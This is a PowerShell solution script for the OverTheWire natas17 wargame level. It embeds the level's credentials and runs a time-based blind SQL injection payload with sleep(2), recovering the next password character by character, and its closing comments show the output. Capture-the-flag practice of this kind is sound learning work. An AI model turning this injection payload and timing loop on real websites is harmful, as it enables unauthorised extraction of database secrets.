
<#
Script to retrieve the password of level 16-17

#>
$url = 'http://natas17.natas.labs.overthewire.org'
$creds = "natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw"
$encodedCreds = [System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($creds))
$headers = @{ Authorization = "Basic $encodedCreds"}

#------------------------------------------------------------
# $a = (Invoke-WebRequest -uri $url -Method Get -Body $sec -proxy "http://localhost:8080" -Headers $headers).content 
# $a





#------------------------------------------------------------


# Get source
# --------------------------------------------------------------------------------

# $url += "/index-source.html"
# $a = (Invoke-WebRequest -uri $url -Method Get  -Headers $headers).content 
# $clean = [System.Web.HttpUtility]::HtmlDecode($a).split("<br />")
# $clean

#source


# /*
# CREATE TABLE `users` (
#   `username` varchar(64) DEFAULT NULL,
#   `password` varchar(64) DEFAULT NULL
# );
# */

# if(array_key_exists("username", $_REQUEST)) {
#     $link = mysql_connect('localhost', 'natas17', '<censored>');
#     mysql_select_db('natas17', $link);
#     
#     $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
#     if(array_key_exists("debug", $_GET)) {
#         echo "Executing query: $query<br>";
#     }

#     $res = mysql_query($query, $link);
#     if($res) {
#     if(mysql_num_rows($res) > 0) {
#         //echo "This user exists.<br>";
#     } else {
#         //echo "This user doesn't exist.<br>";
#     }
#     } else {
#         //echo "Error in query.<br>";
#     }

#     mysql_close($link);
# } else {
# ?>

# <form action="index.php" method="POST">
# Username: <input name="username"><br>
# <input type="submit" value="Check existence" />
# </form>
# <? } ?>



# --------------------------------------------------------------------------------
#GetValidChars
$url = 'http://natas17.natas.labs.overthewire.org/?debug=1'

# $charrs = [char[]]"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
# $cur = ''
$username = 'natas18" and password like binary "%xxx%" and sleep(2) #'
# # $username = 'natas18" #'

$parms = @{"submit" = "Check existence"}
# $validChars = ""

# echo "[x] Getting valid chars"
#     foreach ($c in $charrs){
#         $a = $username -replace("xxx", $c)
#         $parms["username"] = $a

# $t1 =  (get-date).toFiletime()        
# $req = (Invoke-WebRequest -uri $url -Method Post -Body $parms  -proxy "http://localhost:8080" -Headers $headers -WebSession $s).content 
# $t2 =  (get-date).toFiletime()

# $timeSpent = $t2 - $t1
#             if($timeSpent -gt 5000000){
#                 $validChars += $c
#                     echo $validChars

#             }
# $timeSpent
#     }

$validChars = [char[]]"xdghjklmpqstvwyCDFIKOPQRST0457"
$password =""
foreach ($i in 1..32){
    foreach($c in $validChars){
        echo "[x] Trying $password"
        $password = $password + $c
        $a = $username -replace("xxx", $password)
        $parms["username"] = $a
        $t1 =  [DateTimeOffset]::Now.ToUnixTimeSeconds()
       
        $req = (Invoke-WebRequest -uri $url -Method Post -Body $parms  -proxy "http://localhost:8080" -Headers $headers -WebSession $s).content 
        $t2 =  [DateTimeOffset]::Now.ToUnixTimeSeconds()


        $timeSpent = $t2 - $t1
            if($timeSpent -lt 2){
                $password = $password.Substring(0, $password.length -1)

                

           }else {
               break #This never broke like I wanted it to
           }


    }
    echo $password 


}
echo "[x] Done The password is $password"


# [x] Trying xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhd                                                                                                    
# xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP                                                                                                              
# [x] Done The password is xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP                                                                                     

 

